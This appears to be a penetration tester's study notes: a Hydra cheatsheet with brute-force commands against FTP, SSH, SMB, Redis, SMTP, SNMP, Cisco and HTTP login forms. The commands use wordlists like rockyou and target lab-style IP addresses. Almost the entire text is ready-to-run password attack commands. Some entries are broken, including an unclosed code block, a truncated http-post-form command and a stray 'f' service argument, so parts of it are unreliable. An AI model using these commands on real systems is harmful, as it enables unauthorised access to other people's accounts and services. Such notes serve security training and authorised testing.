## Table of Contents

  - [Username/Password Attack](#Username/Password\Attack)
        - [Examples:](#Examples:)
- [Hydra Flags](#hydra\flags)
- [Username Brute Force](#username\brute\force)
- [Hydra Cheatsheet](#hydra\cheatsheet)
  - [Guessing Passwords](#Guessing\Passwords)
  - [Guessing Usernames](#Guessing\Usernames)
  - [Brute Forcing Usernames and Passwords](#Brute\Forcing\Usernames\and\Passwords)
  - [Verbose and Debug Modes](#Verbose\and\Debug\Modes)
  - [Null/Same/Reverse Password Attempts](#Null/Same/Reverse\Password\Attempts)
  - [Saving Output to Disk](#Saving\Output\to\Disk)
  - [Resuming Brute Force Attacks](#Resuming\Brute\Force\Attacks)
  - [Generating Passwords](#Generating\Passwords)
  - [Specifying Non-Default Ports](#Specifying\Non-Default\Ports)
  - [Attacking Multiple Hosts](#Attacking\Multiple\Hosts)
  - [Using Login:Password Combo Files](#Using\Login:Password\Combo\Files)
  - [Concurrent Login Testing](#Concurrent\Login\Testing)
  - [HTTP Form Brute Forcing](#HTTP\Form\Brute\Forcing)
  - [Display Module Usage](#Display\Module\Usage)
  - [Attacking Secured Services](#Attacking\Secured\Services)
  - [Using SSL Connections](#Using\SSL\Connections)
  - [SMB Authentication](#SMB\Authentication)
  - [Redis Brute Forcing](#Redis\Brute\Forcing)
  - [SMTP Brute Forcing](#SMTP\Brute\Forcing)
  - [SNMP Brute Forcing](#SNMP\Brute\Forcing)
  - [Attacking Cisco Devices](#Attacking\Cisco\Devices)
  - [SSH Brute Forcing](#SSH\Brute\Forcing)


![[Pasted image 20240129051012.png]]
## Username/Password Attack

Requires at least 3 flags:
- Credentials
- Target Host
- Target Path


Credentials can also be separated by `usernames` and `passwords`

##### Examples:
#hydraexamples
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```
```bash
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```





# Hydra Flags
```bash
-L  -> Use username wordlist
-P  -> Use password wordlist
-f  -> Stop after first successful login
-u  -> tries all users on ech password
-s -> port #
-l <name>  -> specify username 





# Username Brute Force
*To Specify a certain user to brute force*
```bash
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/seclists/Usernames/CommonAdminBase64.txt
/usr/share/wordlists/seclists/Usernames/Usernames/cirt-default-usernames.txt
/usr/share/wordlists/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
/usr/share/wordlists/seclists/Usernames/Names/names.txt
```

1. **Target IP and Port**: The IP address and port are `83.136.253.102` and `37031`, respectively.
    
2. **HTTP Method and Page**: You are posting to `/login.php`, so the method is POST.
    
3. **Form Parameters**: The form parameters are `username` and `password`.
    
4. **Failure Condition**: You need to know how the server responds to a failed login attempt. This could be a specific message like "Invalid username or password" or a specific HTTP status code. If this is unknown, you may need to attempt a known incorrect login and observe the response.
    
5. **Hydra Syntax**: The basic syntax for Hydra when attacking HTTP forms is:
    
    css
    
    `hydra -l [username] -P [wordlist] [IP] http-post-form "[login_page]:[request_body]:[failure_condition]"`
    
    - `-l`: specifies the username if known, or `-L` followed by a file if you want to brute force usernames from a list.
    - `-P`: specifies the path to the password list.
    - `[login_page]`: the path to the login page (`/login.php` in your case).
    - `[request_body]`: the body of the post request, where the username and password fields are set to `^USER^` and `^PASS^` respectively.
    - `[failure_condition]`: the condition that indicates a login failure.

Given your example, a sample Hydra command might look like this:

`hydra -l admin -P /path/to/password/list.txt 83.136.253.102 -s 37031 http-post-form "/login.php`


# Hydra Cheatsheet

## Guessing Passwords

Guess password for user `ignite`:



`hydra -l ignite -P pass.txt 192.168.1.141 ftp`

## Guessing Usernames

Guess username for password `123`:



`hydra -L users.txt -p 123 192.168.1.141 ftp`

## Brute Forcing Usernames and Passwords



`hydra -L users.txt -P pass.txt 192.168.1.141 ftp`

## Verbose and Debug Modes

**Verbose mode:**
`hydra -L users.txt -P pass.txt 192.168.1.141 ftp -V`

**Debug mode:**

`hydra -l ignite -P pass.txt 192.168.1.141 ftp -d`

## Null/Same/Reverse Password Attempts

`hydra -L users.txt -P pass.txt 192.168.1.141 ftp -V -e nsr`

## Saving Output to Disk

`hydra -L users.txt -P pass.txt 192.168.1.141 ftp -o result.txt`

## Resuming Brute Force Attacks



`hydra -R`

## Generating Passwords



`hydra -l ignite -x 1:3:1 ftp://192.168.1.141`

## Specifying Non-Default Ports



`hydra -L users.txt -P pass.txt 192.168.1.141 ssh -s 2222`

## Attacking Multiple Hosts



`hydra -L users.txt -P pass.txt -M hosts.txt ftp`

Exit after first found login:****
`hydra -L users.txt -P pass.txt -M hosts.txt ftp -F`

## Using Login:Password Combo Files


`hydra -C userpass.txt 192.168.1.141 ftp`

## Concurrent Login Testing


`hydra -L users.txt -P pass.txt 192.168.1.141 ftp -t 3 -V`

## HTTP Form Brute Forcing

POST form:


`hydra -l admin -P pass.txt 192.168.1.150 http-post-form "/login.php:username=^USER^&password=^PASS^"`

GET form:

`hydra 192.168.1.150 -l admin -P pass.txt http-get-form "/login:username=^USER^&password=^PASS^"`

## Display Module Usage

`hydra http-post-form -U`

## Attacking Secured Services


`hydra -l ignite -P pass.txt ftps://192.168.1.141`

Or:

`hydra -l ignite -P pass.txt 192.168.1.141 f`

---

## Using SSL Connections
**Connect over SSL:**

```
hydra -l ignite -P pass.txt ftps://192.168.1.141
```

**Use a client certificate:**  

```
hydra --ssl-cert cert.pem 192.168.1.141 https -V
```

## SMB Authentication 
**NTLM authentication:**   

```  
hydra -l administrator -P pass.txt 192.168.1.141 smb
``` 

**Kerberos authentication:**  
```
hydra -l administrator -P pass.txt 192.168.1.141 smb -I kerberos.conf
```

## Redis Brute Forcing
**Connect over SSL:** 

```
hydra -P pass.txt redis://192.168.1.141 -s 6379 
```

## SMTP Brute Forcing  
**Enumerate users:**

```
hydra -P pass.txt 192.168.1.141 smtp-enum
```

**Brute force with VRFY:**  
```
hydra -l USER -P pass.txt smtp://192.168.1.141
```

## SNMP Brute Forcing 
**Community strings:**   

```
hydra -P comm-pass.txt 192.168.1.141 snmp 
```

## Attacking Cisco Devices
**Enable password:**  

```
hydra -P pass.txt cisco://192.168.1.1 
``` 

## SSH Brute Forcing
**SSH using passphrases:**
```  
hydra -l root -P passphrases.txt 192.168.1.141 ssh -t 4
```

**Target SSH key login:**   
```
hydra -l root -P public_keys 192.168.1.141 sshkey
```
